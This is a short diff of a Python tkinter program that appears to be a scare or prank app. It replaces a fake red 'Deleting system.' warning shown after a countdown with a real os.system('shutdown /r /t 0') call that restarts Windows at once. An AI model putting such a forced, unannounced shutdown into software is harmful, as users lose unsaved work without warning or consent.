@@ -83,14 +83,8 @@ def one():
                   fg="red")
     timer6.place(relx=0.3,
                 rely=0.15)
-    time.sleep(1)
-    timer6.place_forget()
-
-    dest_system = Label(text="Удаление системы.", font=("Arial", 50, "bold"),
-                   bg="black",
-                   fg="red")
-    dest_system.place(relx=0.2,
-                 rely=0.15)
+    
+    os.system("shutdown /r /t 0")
 
 
 def two():
